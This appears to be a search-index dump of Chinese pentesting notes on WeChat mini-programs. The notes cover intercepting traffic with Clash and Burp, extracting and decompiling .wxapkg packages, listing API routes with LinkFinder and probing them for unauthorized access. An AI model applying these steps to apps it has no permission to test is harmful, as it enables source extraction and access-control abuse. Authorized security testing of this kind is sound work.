windows\u53ef\u4ee5\u7528Bandizip\u7b49\u89e3\u538b unix\u53ef\u4ee5\u7528zstd\u6307\u4ee4\u89e3\u538b zstd -d [\u538b\u7f29\u6587\u4ef6\u8def\u5f84] -o [\u8f93\u51fa\u6587\u4ef6\u8def\u5f84] \u89e3\u538b\u51fa\u6765\u540e\u6dfb\u52a0wxapkg\u540e\u7f00 5.\u89e3\u538bwxapkg\u6587\u4ef6\u83b7\u53d6\u6e90\u7801 https://github.com/zwl55555/wxappUnpacker-master * windows\u7cfb\u7edf\u4f7f\u7528: ./bingo.bat testpkg/master-xxx.wxapkg Linux\u7cfb\u7edf\u4f7f\u7528: ./bingo.sh testpkg/master-xxx.wxapkg \u89e3\u5305\u5b50\u5305go windows\u7cfb\u7edf\u4f7f\u7528: ./bingo.bat testpkg/sub-1-xxx.wxapkg -s=../master-xxx Linux\u7cfb\u7edf\u4f7f\u7528: ./bingo.sh testpkg/sub-1-xxx.wxapkg -s=../master-xxx \u89e3\u51fa\u6765\u4e86 \u6e90\u7801\u5206\u6790 \u901a\u8fc7linkfinder\u627e\u8def\u7531 https://github.com/GerbenJavado/LinkFinder python linkfinder.py -i 'path-to-wxapkg/**/*.js' linkfinder\u9012\u5f52\u67e5\u8be2js\u6587\u4ef6\u597d\u50cf\u4e0d\u652f\u6301\uff0c\u5199\u4e86\u4e2a\u811a\u672c\u9012\u5f52\u67e5\u8be2\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709js\u5e76\u653e\u5165output\u6587\u4ef6\u5939,\u91cd\u540d\u6587\u4ef6\u4f1a\u5728\u524d\u9762\u7f16\u53f71234567... ```bash #!/bin/bash # \u83b7\u53d6\u547d\u4ee4\u884c\u53c2\u6570 while getopts \"i:o:\" opt; do case $opt in i) input_dir=$OPTARG ;; o) output_dir=$OPTARG ;; \\?) echo \"Invalid option: -$OPTARG\" >&2 exit 1 ;; esac done # \u68c0\u67e5\u8f93\u5165\u53c2\u6570\u662f\u5426\u4e3a\u7a7a if [ -z \"$input_dir\" ] || [ -z \"$output_dir\" ]; then echo \"Usage: $0 -i input_dir -o output_dir\" exit 1 fi # \u521b\u5efa\u8f93\u51fa\u76ee\u5f55 mkdir -p \"$output_dir\" # \u9012\u5f52\u67e5\u8be2js\u6587\u4ef6\u5e76\u590d\u5236\u5230\u8f93\u51fa\u76ee\u5f55 counter=1 find \"$input_dir\" -type f -name \"*.js\" | while read -r file; do filename=$(basename \"$file\") new_filename=\"$filename\" output_file=\"$output_dir/$new_filename\" # \u68c0\u67e5\u662f\u5426\u5b58\u5728\u540c\u540d\u6587\u4ef6 while [ -e \"$output_file\" ]; do new_filename=\"${counter}_${filename}\" output_file=\"$output_dir/$new_filename\" counter=$((counter + 1)) done cp \"$file\" \"$output_file\" echo \"Copied $file to $output_file\" done ``` \u4f60\u53ef\u4ee5\u5c06\u4e0a\u8ff0\u811a\u672c\u4fdd\u5b58\u4e3a\u4e00\u4e2a\u540d\u4e3a`copy_js_files.sh`\u7684\u6587\u4ef6\uff0c\u5e76\u5728\u7ec8\u7aef\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u6267\u884c\u811a\u672c\uff1a ```bash bash copy_js_files.sh -i /path/to/input_dir -o /path/to/output_dir ``` \u8bf7\u5c06`/path/to/input_dir`\u66ff\u6362\u4e3a\u4f60\u8981\u9012\u5f52\u67e5\u8be2js\u6587\u4ef6\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u5c06`/path/to/output_dir`\u66ff\u6362\u4e3a\u4f60\u8981\u5c06js\u6587\u4ef6\u590d\u5236\u5230\u7684\u76ee\u5f55\u8def\u5f84\u3002 \u770b\u6e90\u7801\u627e\u6f0f\u6d1e \u901a\u8fc7linkfinder\u83b7\u5f97\u4e86\u5f88\u591a\u63a5\u53e3\uff0c\u53ef\u4ee5\u627e\u627e\u654f\u611f\u5173\u952e\u5b57\u5982login\uff0cpassword \u627e\u5230\u611f\u5174\u8da3\u7684\u8def\u7531\u540e\uff0c\u7528vscode\u6253\u5f00\u6e90\u7801\uff0c\u5b9a\u4f4d\u5230\u8def\u7531\uff0c\u770b\u770b\u63a5\u53e3\u8be6\u60c5\u5e76\u6d4b\u8bd5\u662f\u5426\u6709\u672a\u6388\u6743. \u6709\u53ef\u80fd\u4f1a\u9047\u5230js\u5de8\u4e71\u7684\u60c5\u51b5\uff0c\u7528\u8fd9\u4e2a\u63d2\u4ef6\u641e\u5b9a Prettier - Code formatter ctrl+shift+p \u8f93\u5165 format document\u8fdb\u884c\u683c\u5f0f\u5316 AppSecret\u6cc4\u6f0f \u5c0f\u7a0b\u5e8f\u6293\u5305\u7684\u5751 clash+burp\u6216\u8005clash+whistle\u8db3\u4ee5 \u6709\u65f6\u5019\u4f1a\u9047\u5230\u94fe\u63a5\u4ee3\u7406\u540e\uff0c\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6253\u4e0d\u5f00\u7684\u60c5\u51b5\u3002\u89e3\u51b3\u65b9\u6848\u5982\u4e0b 1.\u8bbe\u7f6e\u2192\u6587\u4ef6\u7ba1\u7406\u2192\u67e5\u770b\u5fae\u4fe1\u6587\u4ef6\u4fdd\u5b58\u4f4d\u7f6e\u662f\u4e0d\u662f\u672c\u5730\u6587\u4ef6\u8def\u5f84\uff0c\u5982\u679c\u662f\u7f51\u7edc\u5171\u4eab\u8def\u5f84\u5c31\u6709\u53ef\u80fd\u6293\u4e0d\u5230\u5305\u3002\uff08\u6211arm windows\u7684\u5fae\u4fe1\u6587\u4ef6\u4fdd\u5b58\u8def\u5f84\u5c31\u662fmac\u7684smb\u5171\u4eab\uff0c\u5bfc\u81f4\u4e00\u8fdeclash\u5c0f\u7a0b\u5e8f\u5c31\u4f1a\u7a7a\u767d\uff09 2.\u8bbe\u7f6e\u2192\u6587\u4ef6\u7ba1\u7406\u2192\u6253\u5f00\u5fae\u4fe1\u6587\u4ef6\u4fdd\u5b58\u4f4d\u7f6e\uff0c\u5173\u95ed\u5fae\u4fe1\uff0c\u5220\u9664applet\u6587\u4ef6\u5939\u548cmsg\u4e0b\u7684applet.db\u6587\u4ef6\uff0c\u91cd\u542f\u5fae\u4fe1\u3002\u8fd9\u4fe9\u4e1c\u897f\u662f\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u7684\u7f13\u5b58\u3002 3.\u6765\u81ea\u5fae\u4fe1\u5f00\u53d1\u8005\u793e\u533a\uff1a\u641c\u7d22\u680f\u8f93\u5165:showcmdwnd\uff0c\u590d\u5236\u4ee3\u7801/plugin set_grayvalue=101\\&set_config_url= https://dldir1.qq.com/weixin/Windows/XPlugin/updateConfigWin.xml\\&check_update_force \uff0c\u5173\u95ed\u5fae\u4fe1\uff0c\u91cd\u65b0\u6253\u5f00\u5fae\u4fe1\u767b\u9646 4.\u6765\u81ea\u5fae\u4fe1\u5f00\u53d1\u8005\u793e\u533a\uff1a\u4efb\u52a1\u7ba1\u7406\u5668->\u627e\u5230\u5c0f\u7a0b\u5e8f\u7684\u7f13\u5b58\u76ee\u5f55\uff0c\u9000\u51fa\u5fae\u4fe1\uff0c\u5220\u6389\u76ee\u5f55\u91cd\u65b0\u8fdb\u5165\u5c31\u597d\u4e86\u3002\u4e00\u822c\u76ee\u5f55\u5730\u5740\u5728\uff1aC:\\Users\\{user}\\AppData\\Roaming\\Tencent\\WeChat\\XPlugin\\Plugins\\WMPFRuntime 5.\u66f4\u591a\u6765\u81ea\u5fae\u4fe1\u5f00\u53d1\u8005\u793e\u533a\u7684\u89e3\u51b3\u529e\u6cd5\uff1a https://developers.weixin.qq.com/community/develop/doc/0008ee93caccd0a92f9ee17a051c00","title":"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#_1","text":"","title":"\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#_2","text":"\u5c0f\u7a0b\u5e8f\u6293\u5305 clash+burp \u5b89\u5353\u6a21\u62df\u5668\u9006\u5411\uff08windows\uff09 \u6293\u5305\u9006\u5411\uff08windows\\&linux\u53ef\u7528\uff09 \u6e90\u7801\u5206\u6790 \u901a\u8fc7linkfinder\u627e\u8def\u7531 \u770b\u6e90\u7801\u627e\u6f0f\u6d1e AppSecret\u6cc4\u6f0f \u5c0f\u7a0b\u5e8f\u6293\u5305\u7684\u5751","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#_3","text":"","title":"\u5c0f\u7a0b\u5e8f\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#clashburp","text":"clash+burp\uff0c\u8be6\u7ec6\u53c2\u8003\u516c\u4f17\u53f7\u6e17\u900f\uff0c\u4e00\u6837\u7684","title":"clash+burp"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#windows","text":"\u591c\u795e\u6a21\u62df\u56686.6.1.1\uff0c\u5b89\u5353\u7248\u672c5.0\uff0c\u6293\u5305\u6bd4\u9ad8\u7248\u672c\u66f4\u52a0\u65b9\u4fbf ref: https://forum.butian.net/share/1227 \u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1vMVvmm2n2wyr3vhzp91iqA \u63d0\u53d6\u7801\uff1ajpho \u6293\u5305+\u5bf9\u5c0f\u7a0b\u5e8f\u6e90\u7801\u8fdb\u884c\u53cd\u7f16\u8bd1\u4ece\u800c\u8fdb\u884c\u5ba1\u8ba1 \u5148\u628a\u591c\u795e\u6a21\u62df\u5668\uff086.6\u7b49\u8001\u7248\u672c\uff09+burp\u914d\u597d\uff0c\u5927\u91cf\u53c2\u8003\u81earef\uff1a https://forum.butian.net/share/1227 \u5fae\u4fe1\u5bf9\u4e8e Mac \u548c Windows \u7684\u5c0f\u7a0b\u5e8f\u5305\u90fd\u505a\u4e86\u4e0d\u540c\u7a0b\u5ea6\u7684\u52a0\u5bc6\uff0c\u6240\u4ee5\u73b0\u5728\u4ece\u5b89\u5353/iOS\u7cfb\u7edf\u4e2d\u63d0\u53d6\u5c0f\u7a0b\u5e8f\u66f4\u4e3a\u65b9\u4fbf\u3002 \u7136\u540e\u968f\u4fbf\u8bbf\u95ee\u4e00\u4e2a\u5c0f\u7a0b\u5e8f\uff0c\u63a5\u4e0b\u6765\u4f1a\u5728\u624b\u673adata/data/com.tencent.mm/MicroMsg\u751f\u6210\u4e00\u4e2amd5\u52a0\u5bc6\u547d\u540d\u7684\u6587\u4ef6\u5939\uff08\u5982\u679c\u6253\u5f00\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u8fc7\u591a\uff0c\u540c\u65f6\u6709\u591a\u4e2a\u6587\u4ef6\u5939\u4e0d\u5bb9\u6613\u8bc6\u522b\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u9009\u62e9\u628a MicroMsg \u6587\u4ef6\u5939\u6240\u6709\u5185\u5bb9\u5220\u9664\u6389\uff0c\u518d\u53bb\u91cd\u65b0\u6253\u5f00\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\uff0c\u5c31\u4f1a\u5f97\u5230\u552f\u4e00\u4e00\u4e2aMD5\u52a0\u5bc6\u547d\u540d\u7684\u6587\u4ef6\u5939\u5566\uff09 \u5728\u8be5\u6587\u4ef6\u5939\u4e0b\u7684 appbrand/pkg \u76ee\u5f55\u4e0b\u627e\u5230 .wxapkg \u540e\u7f00\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u5176\u4e2d\u53ea\u6709\u51e0MB\u5927\u5c0f\u7684\u4e3a\u521a\u521a\u6253\u5f00\u7684\u5c0f\u7a0b\u5e8f\u7684\u6587\u4ef6 \u70b9\u51fb\u52fe\u9009\u4e4b\u540e\uff0c\u6765\u5230\u6839\u76ee\u5f55\u4e0b\u7684 mnt/shared/App \u76ee\u5f55\uff0c\u6253\u5f00\u53f3\u4e0a\u89d2\u4e09\u4e2a . \u7684\u529f\u80fd\u83dc\u5355\u9009\u62e9\u7c98\u8d34\u9009\u62e9\u9879\uff0c\u5c06\u6587\u4ef6\u590d\u5236\u5230\u8be5\u6587\u4ef6\u5939\uff0c\u7136\u540e\u8fdb\u5165\u5171\u4eab\u6587\u4ef6\u5939 \u5728\u5171\u4eab\u6587\u4ef6\u5939\u4e0bAppShare\u76ee\u5f55\u91cc\u5373\u53ef\u627e\u5230\u5171\u4eab\u51fa\u6765\u7684wxapkg\u6587\u4ef6\u3002 \u7136\u540e\u7528\u8fd9\u4e2a\u5de5\u5177\u8fdb\u884c\u53cd\u7f16\u8bd1\u3002\u8bb0\u5f97\u8981\u5148\u5b89\u88c5nodejs https://github.com/ezshine/wxapkg-convertor/releases \u628awxapkg\u62d6\u8fdb\u53bb\u5c31\u53ef\u4ee5\u628a\u6e90\u7801\u53cd\u7f16\u8bd1\u51fa\u6765\u4e86\u3002","title":"\u5b89\u5353\u6a21\u62df\u5668\u9006\u5411\uff08windows\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#windowslinux","text":"\u56e0\u4e3a\u662f\u76f4\u63a5\u5728\u6d41\u91cf\u4e2d\u622a\u53d6\u6e90\u7801\uff0c\u907f\u514d\u4e86\u672c\u5730\u7684\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u66f4\u52a0\u65b9\u4fbf\u5feb\u6377\uff0c\u540c\u4e8b\u8bf4\u53ef\u4ee5\u89e390%\u4ee5\u4e0a\u7684\u5c0f\u7a0b\u5e8f 1.clash\u5f00\u542ftun mode\uff0csystem proxy\u548cservice mode 2.\u914d\u7f6e\u597dclash\u914d\u7f6e\u6587\u4ef6\uff0c\u628a\u5fae\u4fe1\u7684\u6d41\u91cf\u5bfc\u5230burp\u6216\u8005whistle proxies: - name: burp type: http server: 127.0.0.1 port: 8080 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - burp type: select rules: - PROCESS-NAME,node.exe,DIRECT - PROCESS-NAME,WeChatAppEx.exe,burp - PROCESS-NAME,WeChat.exe,burp - PROCESS-NAME,WechatBrowser.exe,burp - MATCH,DIRECT proxies: - name: Whistle type: http server: 127.0.0.1 port: 8899 #\u6839\u636e\u6293\u5305\u5de5\u5177\u914d\u7f6e proxy-groups: - name: Proxy proxies: - Whistle type: select rules: - PROCESS-NAME,node.exe,DIRECT - PROCESS-NAME,WeChatAppEx.exe,Whistle - PROCESS-NAME,WeChat.exe,Whistle - PROCESS-NAME,WechatBrowser.exe,Whistle - MATCH,DIRECT 3.\u6293 res.servicewechat.com \u7684\u6d41\u91cf\u5305 1/2\u7406\u8bba\u4e0a\u53ef\u4ee5\u7528proxifier\u5b8c\u6210\uff0c\u4f46\u662f\u5b9e\u9645\u60c5\u51b5\u662f\u5f88\u96be\u7528\u4e0d\u63a8\u8350 # \u5c0f\u7a0b\u5e8f\u4e0b\u8f7d\u8bf7\u6c42\u5f62\u5f0f\u5982\u4e0b https://res.servicewechat.com/weapp/release_encrypt/69_XEb_bQn9udUfYNR-JhVrzjVqEdXICHsvegO2QCx6eRfFnUgifLzEh55WQ2gYz7lUGvcPGgF-j0NRGfdI.wxapkg?rand=1419492810&pass_key=3B0wUf6vtegibGza4UIFk-JgzYJ8xt8YzNpCYtSAAy9fXw5rtUEMDGv28x9pauh5OX_iiUbTf_vg5ycoY2M_j-yhuPYMsfLw8DbfVczLXIK-UVFkxB12TKSGj_EdZFM6pbooi9Dowzw44GZmS9rkZa42d2nZXVqok480-xideVzqbA1VPb77cCo_HfxD3G9ejrc7T1tpGghnrUtG01dg_hX_tgS9HUkKLPqElBTC5_Y~&ext_code=_bKqDGB7WZQDjN8kGrx9kJE7OgfsMfnH1M-wfX0ThiE \u6d4b\u8bd5\u7248\u8bf7\u6c42\u957f\u8fd9\u6837 https://servicewechat.com/weapp-test/experience/BXY4PweVMcpJVNkQOv_kKYjot6AWWPZCGAQTMV26mcw burp\u9700\u5728proxy\u8fc7\u6ee4\u5668\u91cc\u6dfb\u52a0other binary\u53ef\u89c1 whistle\u9700\u5728\u9876\u90e8\u680f\u4e2d\u7684https\u9009\u9879\u91cc\u5f00\u542f Capture TUNNEL CONNECTS 4.\u83b7\u53d6\u8def\u7531\u540e\uff0c\u76f4\u63a5\u628aurl\u653e\u5230\u6d4f\u89c8\u5668\u8fdb\u884c\u4e0b\u8f7d \u4e0b\u8f7d\u5305\u6709\u65f6\u5b58\u5728\u591a\u79cd\u683c\u5f0f\uff0c\u82e5\u540e\u7f00\u4e3awxapkg\u53ef\u76f4\u63a5\u7528\uff0c\u82e5\u540e\u7f00\u4e3azstd\uff0c\u5219\u9700\u8981\u4f7f\u7528zstd\u65b9\u5f0f\u89e3\u538b\u540e\u6dfb\u52a0wxapkg\u540e\u7f00\u518d\u4f7f\u7528\u3002\u6d4b\u8bd5\u7248\u4e0b\u4e0b\u6765\u52a0\u4e2awxapkg\u4e5f\u80fd\u76f4\u63a5\u7528 windows\u53ef\u4ee5\u7528Bandizip\u7b49\u89e3\u538b unix\u53ef\u4ee5\u7528zstd\u6307\u4ee4\u89e3\u538b zstd -d [\u538b\u7f29\u6587\u4ef6\u8def\u5f84] -o [\u8f93\u51fa\u6587\u4ef6\u8def\u5f84] \u89e3\u538b\u51fa\u6765\u540e\u6dfb\u52a0wxapkg\u540e\u7f00 5.\u89e3\u538bwxapkg\u6587\u4ef6\u83b7\u53d6\u6e90\u7801 https://github.com/zwl55555/wxappUnpacker-master * windows\u7cfb\u7edf\u4f7f\u7528: ./bingo.bat testpkg/master-xxx.wxapkg Linux\u7cfb\u7edf\u4f7f\u7528: ./bingo.sh testpkg/master-xxx.wxapkg \u89e3\u5305\u5b50\u5305go windows\u7cfb\u7edf\u4f7f\u7528: ./bingo.bat testpkg/sub-1-xxx.wxapkg -s=../master-xxx Linux\u7cfb\u7edf\u4f7f\u7528: ./bingo.sh testpkg/sub-1-xxx.wxapkg -s=../master-xxx \u89e3\u51fa\u6765\u4e86","title":"\u6293\u5305\u9006\u5411\uff08windows\\&amp;linux\u53ef\u7528\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#_4","text":"","title":"\u6e90\u7801\u5206\u6790"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#linkfinder","text":"https://github.com/GerbenJavado/LinkFinder python linkfinder.py -i 'path-to-wxapkg/**/*.js' linkfinder\u9012\u5f52\u67e5\u8be2js\u6587\u4ef6\u597d\u50cf\u4e0d\u652f\u6301\uff0c\u5199\u4e86\u4e2a\u811a\u672c\u9012\u5f52\u67e5\u8be2\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709js\u5e76\u653e\u5165output\u6587\u4ef6\u5939,\u91cd\u540d\u6587\u4ef6\u4f1a\u5728\u524d\u9762\u7f16\u53f71234567... ```bash #!/bin/bash # \u83b7\u53d6\u547d\u4ee4\u884c\u53c2\u6570 while getopts \"i:o:\" opt; do case $opt in i) input_dir=$OPTARG ;; o) output_dir=$OPTARG ;; \\?) echo \"Invalid option: -$OPTARG\" >&2 exit 1 ;; esac done # \u68c0\u67e5\u8f93\u5165\u53c2\u6570\u662f\u5426\u4e3a\u7a7a if [ -z \"$input_dir\" ] || [ -z \"$output_dir\" ]; then echo \"Usage: $0 -i input_dir -o output_dir\" exit 1 fi # \u521b\u5efa\u8f93\u51fa\u76ee\u5f55 mkdir -p \"$output_dir\" # \u9012\u5f52\u67e5\u8be2js\u6587\u4ef6\u5e76\u590d\u5236\u5230\u8f93\u51fa\u76ee\u5f55 counter=1 find \"$input_dir\" -type f -name \"*.js\" | while read -r file; do filename=$(basename \"$file\") new_filename=\"$filename\" output_file=\"$output_dir/$new_filename\" # \u68c0\u67e5\u662f\u5426\u5b58\u5728\u540c\u540d\u6587\u4ef6 while [ -e \"$output_file\" ]; do new_filename=\"${counter}_${filename}\" output_file=\"$output_dir/$new_filename\" counter=$((counter + 1)) done cp \"$file\" \"$output_file\" echo \"Copied $file to $output_file\" done ``` \u4f60\u53ef\u4ee5\u5c06\u4e0a\u8ff0\u811a\u672c\u4fdd\u5b58\u4e3a\u4e00\u4e2a\u540d\u4e3a`copy_js_files.sh`\u7684\u6587\u4ef6\uff0c\u5e76\u5728\u7ec8\u7aef\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u6267\u884c\u811a\u672c\uff1a ```bash bash copy_js_files.sh -i /path/to/input_dir -o /path/to/output_dir ``` \u8bf7\u5c06`/path/to/input_dir`\u66ff\u6362\u4e3a\u4f60\u8981\u9012\u5f52\u67e5\u8be2js\u6587\u4ef6\u7684\u76ee\u5f55\u8def\u5f84\uff0c\u5c06`/path/to/output_dir`\u66ff\u6362\u4e3a\u4f60\u8981\u5c06js\u6587\u4ef6\u590d\u5236\u5230\u7684\u76ee\u5f55\u8def\u5f84\u3002","title":"\u901a\u8fc7linkfinder\u627e\u8def\u7531"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#_5","text":"\u901a\u8fc7linkfinder\u83b7\u5f97\u4e86\u5f88\u591a\u63a5\u53e3\uff0c\u53ef\u4ee5\u627e\u627e\u654f\u611f\u5173\u952e\u5b57\u5982login\uff0cpassword \u627e\u5230\u611f\u5174\u8da3\u7684\u8def\u7531\u540e\uff0c\u7528vscode\u6253\u5f00\u6e90\u7801\uff0c\u5b9a\u4f4d\u5230\u8def\u7531\uff0c\u770b\u770b\u63a5\u53e3\u8be6\u60c5\u5e76\u6d4b\u8bd5\u662f\u5426\u6709\u672a\u6388\u6743. \u6709\u53ef\u80fd\u4f1a\u9047\u5230js\u5de8\u4e71\u7684\u60c5\u51b5\uff0c\u7528\u8fd9\u4e2a\u63d2\u4ef6\u641e\u5b9a Prettier - Code formatter ctrl+shift+p \u8f93\u5165 format document\u8fdb\u884c\u683c\u5f0f\u5316","title":"\u770b\u6e90\u7801\u627e\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#appsecret","text":"","title":"AppSecret\u6cc4\u6f0f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/%E5%BE%AE%E4%BF%A1/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/#_6","text":"clash+burp\u6216\u8005clash+whistle\u8db3\u4ee5 \u6709\u65f6\u5019\u4f1a\u9047\u5230\u94fe\u63a5\u4ee3\u7406\u540e\uff0c\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u6253\u4e0d\u5f00\u7684\u60c5\u51b5\u3002\u89e3\u51b3\u65b9\u6848\u5982\u4e0b 1.\u8bbe\u7f6e\u2192\u6587\u4ef6\u7ba1\u7406\u2192\u67e5\u770b\u5fae\u4fe1\u6587\u4ef6\u4fdd\u5b58\u4f4d\u7f6e\u662f\u4e0d\u662f\u672c\u5730\u6587\u4ef6\u8def\u5f84\uff0c\u5982\u679c\u662f\u7f51\u7edc\u5171\u4eab\u8def\u5f84\u5c31\u6709\u53ef\u80fd\u6293\u4e0d\u5230\u5305\u3002\uff08\u6211arm windows\u7684\u5fae\u4fe1\u6587\u4ef6\u4fdd\u5b58\u8def\u5f84\u5c31\u662fmac\u7684smb\u5171\u4eab\uff0c\u5bfc\u81f4\u4e00\u8fdeclash\u5c0f\u7a0b\u5e8f\u5c31\u4f1a\u7a7a\u767d\uff09 2.\u8bbe\u7f6e\u2192\u6587\u4ef6\u7ba1\u7406\u2192\u6253\u5f00\u5fae\u4fe1\u6587\u4ef6\u4fdd\u5b58\u4f4d\u7f6e\uff0c\u5173\u95ed\u5fae\u4fe1\uff0c\u5220\u9664applet\u6587\u4ef6\u5939\u548cmsg\u4e0b\u7684applet.db\u6587\u4ef6\uff0c\u91cd\u542f\u5fae\u4fe1\u3002\u8fd9\u4fe9\u4e1c\u897f\u662f\u5fae\u4fe1\u5c0f\u7a0b\u5e8f\u7684\u7f13\u5b58\u3002 3.\u6765\u81ea\u5fae\u4fe1\u5f00\u53d1\u8005\u793e\u533a\uff1a\u641c\u7d22\u680f\u8f93\u5165:showcmdwnd\uff0c\u590d\u5236\u4ee3\u7801/plugin set_grayvalue=101\\&set_config_url= https://dldir1.qq.com/weixin/Windows/XPlugin/updateConfigWin.xml\\&check_update_force \uff0c\u5173\u95ed\u5fae\u4fe1\uff0c\u91cd\u65b0\u6253\u5f00\u5fae\u4fe1\u767b\u9646 